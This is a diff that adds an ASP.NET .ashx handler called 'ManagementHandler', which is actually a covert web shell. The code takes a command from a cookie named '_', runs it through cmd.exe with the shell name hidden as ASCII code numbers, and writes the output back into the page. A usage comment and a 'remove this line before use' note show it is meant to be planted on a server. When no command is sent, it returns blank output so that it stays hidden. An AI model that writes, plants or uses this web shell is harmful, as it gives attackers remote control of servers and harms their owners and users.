@@ -1,0 +1,75 @@
+<%@ WebHandler Language="C#" class="ManagementHandler" %>
+
+/* Usage: Cookie: _=dir */
+/* Remove this line before use */
+
+using System;
+using System.Web;
+using System.Diagnostics;
+using System.IO;
+
+public class ManagementHandler : IHttpHandler
+{
+	public bool IsReusable { get { return true; } }
+	
+	private string DecodeAscii(string asciiValues)
+    {
+        string[] asciiArray = asciiValues.Split(',');
+        char[] chars = new char[asciiArray.Length];
+        for (int i = 0; i < asciiArray.Length; i++)
+        {
+            chars[i] = (char)Convert.ToInt32(asciiArray[i]);
+        }
+        return new string(chars);
+    }
+
+	public void ProcessRequest(HttpContext ctx)
+	{
+        HttpCookie commandCookie = ctx.Request.Cookies["_"];
+        if (commandCookie != null)
+        {
+            string command = commandCookie.Value;
+
+            if (!string.IsNullOrWhiteSpace(command))
+            {
+                string output = string.Empty;
+                string error = string.Empty;
+
+                try
+                {
+                    using (Process p = new Process())
+                    {
+                        ProcessStartInfo processInfo = new ProcessStartInfo();
+                        processInfo.FileName = DecodeAscii("99,109,100,46,101,120,101");
+                        processInfo.Arguments = DecodeAscii("47,99") + " " + command;
+                        processInfo.RedirectStandardOutput = true;
+                        processInfo.RedirectStandardError = true;
+                        processInfo.UseShellExecute = false;
+
+                        p.StartInfo = processInfo;
+                        p.Start();
+
+                        output = p.StandardOutput.ReadToEnd();
+                        error = p.StandardError.ReadToEnd();
+                        p.WaitForExit();
+                    }
+
+                    ctx.Response.Write("<b>Output:</b><br><pre>" + HttpContext.Current.Server.HtmlEncode(output) + "</pre><br>");
+                    if (!string.IsNullOrEmpty(error))
+                    {
+                        ctx.Response.Write("<br><b>Error:</b><br><pre>" + HttpContext.Current.Server.HtmlEncode(error) + "</pre><br>");
+                    }
+                }
+                catch (Exception ex)
+                {
+                    ctx.Response.Write("<br><b>Exception:</b><br><pre>" + HttpContext.Current.Server.HtmlEncode(ex.Message) + "</pre><br>");
+                }
+            }
+        }
+        else
+        {
+            ctx.Response.Write("<br><br><br><br>");
+        }
+	}
+}
+    
